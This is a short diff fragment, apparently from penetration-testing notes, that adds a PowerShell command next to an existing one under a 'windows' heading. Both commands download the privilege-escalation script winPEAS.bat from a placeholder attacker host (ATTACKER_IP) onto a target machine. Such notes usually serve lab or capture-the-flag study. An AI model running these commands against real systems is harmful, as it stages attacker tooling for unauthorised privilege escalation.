@@ -22,6 +22,7 @@ ftp
 windows
 
 ```
+powershell -command "invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat"
 invoke-webrequest -Uri 'http://ATTACKER_IP/winPEAS.bat' -OutFile winpeas.bat
 ```
 
